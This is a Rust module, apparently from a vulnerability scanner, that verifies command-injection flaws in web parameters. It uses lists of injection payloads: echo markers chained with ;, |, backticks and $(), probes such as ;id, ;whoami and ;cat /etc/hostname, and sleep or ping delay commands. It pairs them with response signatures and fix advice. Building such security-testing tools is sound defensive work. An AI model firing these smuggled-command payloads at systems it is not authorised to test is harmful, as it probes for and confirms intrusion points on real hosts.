//! 命令执行验证
//!
//! 验证命令注入漏洞的可利用性:
//! - 检测响应体中是否包含命令执行回显（id/whoami/uname 等）
//! - 使用无害的标记字符串验证回显注入
//! - 时间盲注（PING/SLEEP 等延时命令）
//!
//! 注意：本模块使用无害的 payload（如 echo marker）验证漏洞，
//! 不执行破坏性命令（如 rm/cat /etc/passwd 等）

use crate::engine::VerifyEngine;
use crate::types::*;

/// 命令执行验证器
pub struct CmdExecVerifier {
    engine: VerifyEngine,
}

impl CmdExecVerifier {
    pub fn new(engine: VerifyEngine) -> Self {
        Self { engine }
    }

    pub fn with_default_engine() -> Self {
        Self::new(VerifyEngine::with_default_config())
    }

    /// 验证参数的命令注入
    pub async fn verify(
        &self,
        url: &str,
        method: &str,
        param: &str,
        original_value: &str,
    ) -> VerifyResult {
        let mut result = VerifyResult::new(url.to_string(), VulnType::CommandExecution);
        result.severity = "critical".to_string();

        // 1. 先用标记 echo 验证回显
        if let Some((payload, evidence)) = self.try_echo_marker(url, method, param).await {
            result.status = VerifyStatus::Verified;
            result.payload = Some(payload);
            result.evidence = evidence;
            result.request = build_cmd_request(url, method, param, &result.payload.clone().unwrap_or_default());
            result.fix_advice = Some("避免将用户输入直接传入系统命令；使用安全的 API（如 execve 的参数数组形式）；严格白名单过滤"
                .to_string());
            return result;
        }

        // 2. 检测已知命令输出特征（id/whoami 等）
        if let Some((payload, evidence)) = self.try_cmd_patterns(url, method, param).await {
            result.status = VerifyStatus::Verified;
            result.payload = Some(payload);
            result.evidence = evidence;
            result.request = build_cmd_request(url, method, param, &result.payload.clone().unwrap_or_default());
            result.fix_advice = Some("避免将用户输入直接传入系统命令；使用参数化 API；严格白名单过滤".to_string());
            return result;
        }

        // 3. 时间盲注（PING 延时）
        if let Some((payload, evidence)) = self.try_time_based(url, method, param).await {
            result.status = VerifyStatus::Verified;
            result.payload = Some(payload);
            result.evidence = evidence;
            result.request = build_cmd_request(url, method, param, &result.payload.clone().unwrap_or_default());
            result.fix_advice = Some("命令注入时间盲注：使用安全 API 替代系统命令调用；输入白名单过滤".to_string());
            return result;
        }

        result.status = VerifyStatus::NotVerified;
        result.evidence = "未检测到命令执行特征".to_string();
        result.request = build_cmd_request(url, method, param, original_value);
        result
    }

    /// 使用唯一标记验证命令执行（echo <marker>）
    async fn try_echo_marker(
        &self,
        url: &str,
        method: &str,
        param: &str,
    ) -> Option<(String, String)> {
        let marker = generate_marker();
        for payload_template in CMD_ECHO_PAYLOADS {
            let payload = payload_template.replace("{MARKER}", &marker);
            let req = build_cmd_request(url, method, param, &payload);
            if let Ok(resp) = self.engine.send_request(&req).await {
                if resp.body.contains(&marker) {
                    return Some((
                        payload,
                        format!("echo 标记 '{}' 在响应中出现，命令被执行", marker),
                    ));
                }
            }
        }
        None
    }

    /// 检测已知命令输出特征
    async fn try_cmd_patterns(
        &self,
        url: &str,
        method: &str,
        param: &str,
    ) -> Option<(String, String)> {
        for payload in CMD_PATTERN_PAYLOADS {
            let req = build_cmd_request(url, method, param, payload);
            if let Ok(resp) = self.engine.send_request(&req).await {
                for (pattern, cmd_name) in CMD_SUCCESS_PATTERNS {
                    if resp.body.contains(pattern) {
                        return Some((
                            payload.to_string(),
                            format!("检测到命令输出特征: '{}' (来自 {})", pattern, cmd_name),
                        ));
                    }
                }
            }
        }
        None
    }

    /// 时间盲注（基于 PING/SLEEP 等延时命令）
    async fn try_time_based(
        &self,
        url: &str,
        method: &str,
        param: &str,
    ) -> Option<(String, String)> {
        for payload in CMD_TIME_PAYLOADS {
            let req = build_cmd_request(url, method, param, payload);
            if let Ok(resp) = self.engine.send_request(&req).await {
                let threshold_ms = 3000;
                if resp.elapsed_ms >= threshold_ms {
                    return Some((
                        payload.to_string(),
                        format!(
                            "命令执行时间盲注: 响应耗时 {}ms (超过 {}ms 阈值)",
                            resp.elapsed_ms, threshold_ms
                        ),
                    ));
                }
            }
        }
        None
    }
}

/// 构造命令注入测试请求
fn build_cmd_request(url: &str, method: &str, param: &str, value: &str) -> VerifyRequest {
    let mut req = VerifyRequest::default();
    req.method = method.to_string();
    req.timeout_secs = 20;

    if method.eq_ignore_ascii_case("GET") {
        let parsed = url::Url::parse(url).ok();
        if let Some(mut parsed) = parsed {
            parsed.query_pairs_mut().clear().append_pair(param, value);
            req.url = parsed.to_string();
        } else {
            req.url = url.to_string();
        }
    } else {
        req.url = url.to_string();
        req.body = Some(format!("{}={}", param, value));
        req.headers.push((
            "Content-Type".to_string(),
            "application/x-www-form-urlencoded".to_string(),
        ));
    }
    req
}

/// 生成唯一标记（避免误报）
fn generate_marker() -> String {
    use std::collections::hash_map::DefaultHasher;
    use std::hash::{Hash, Hasher};
    let mut hasher = DefaultHasher::new();
    std::time::SystemTime::now().hash(&mut hasher);
    let hash = hasher.finish();
    format!("argus{:x}", hash & 0xFFFFFFFF)
}

/// echo 标记 payload 模板（{MARKER} 会被替换为唯一标记）
const CMD_ECHO_PAYLOADS: &[&str] = &[
    ";echo {MARKER}",
    "|echo {MARKER}",
    "`echo {MARKER}`",
    "$(echo {MARKER})",
    "&&echo {MARKER}",
    "||echo {MARKER}",
    ";echo${IFS}{MARKER}",
    "|echo${IFS}{MARKER}",
    "$(echo${IFS}{MARKER})",
    ";\t echo {MARKER}",
];

/// 用于检测已知输出的命令 payload
const CMD_PATTERN_PAYLOADS: &[&str] = &[
    ";id",
    "|id",
    "`id`",
    "$(id)",
    ";whoami",
    "|whoami",
    ";uname -a",
    "|uname -a",
    ";cat /etc/hostname",
    "|cat /etc/hostname",
];

/// 命令输出特征与命令名映射
const CMD_SUCCESS_PATTERNS: &[(&str, &str)] = &[
    ("uid=", "id"),
    ("gid=", "id"),
    ("groups=", "id"),
    ("root", "whoami/uname"),
    ("Linux", "uname"),
    ("Darwin", "uname"),
    ("GNU", "uname"),
    ("BSD", "uname"),
    ("total ", "ls"),
    ("drwx", "ls"),
    ("-rw-r--r--", "ls"),
];

/// 时间盲注命令 payload
const CMD_TIME_PAYLOADS: &[&str] = &[
    ";sleep 5",
    "|sleep 5",
    "`sleep 5`",
    "$(sleep 5)",
    "& ping -c 5 127.0.0.1",
    "& timeout 5 ping -c 5 127.0.0.1",
    "&&ping -n 5 127.0.0.1",
    "& ping -n 5 127.0.0.1",
];

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_generate_marker_unique() {
        let m1 = generate_marker();
        // 短暂休眠后再次生成，应得到不同标记
        std::thread::sleep(std::time::Duration::from_millis(20));
        let m2 = generate_marker();
        assert!(m1.starts_with("argus"));
        assert!(m2.starts_with("argus"));
        assert_ne!(m1, m2, "两次生成的标记应不同");
    }

    #[test]
    fn test_cmd_echo_payloads_not_empty() {
        assert!(!CMD_ECHO_PAYLOADS.is_empty());
    }

    #[test]
    fn test_cmd_echo_payloads_have_marker() {
        for p in CMD_ECHO_PAYLOADS {
            assert!(p.contains("{MARKER}"), "payload '{}' 应包含 {{MARKER}}", p);
        }
    }

    #[test]
    fn test_cmd_pattern_payloads_not_empty() {
        assert!(!CMD_PATTERN_PAYLOADS.is_empty());
    }

    #[test]
    fn test_cmd_success_patterns_not_empty() {
        assert!(!CMD_SUCCESS_PATTERNS.is_empty());
    }

    #[test]
    fn test_cmd_time_payloads_use_sleep_or_ping() {
        for p in CMD_TIME_PAYLOADS {
            assert!(
                p.contains("sleep") || p.contains("ping"),
                "payload '{}' 应包含 sleep 或 ping",
                p
            );
        }
    }

    #[test]
    fn test_build_cmd_request_get() {
        let req = build_cmd_request(
            "http://example.com/ping?host=1.1.1.1",
            "GET",
            "host",
            ";id",
        );
        assert_eq!(req.method, "GET");
        assert!(req.url.contains("host="));
    }

    #[test]
    fn test_build_cmd_request_post() {
        let req = build_cmd_request(
            "http://example.com/ping",
            "POST",
            "host",
            "|whoami",
        );
        assert_eq!(req.method, "POST");
        assert!(req.body.is_some());
        assert!(req.headers.iter().any(|(k, _)| k == "Content-Type"));
    }
}
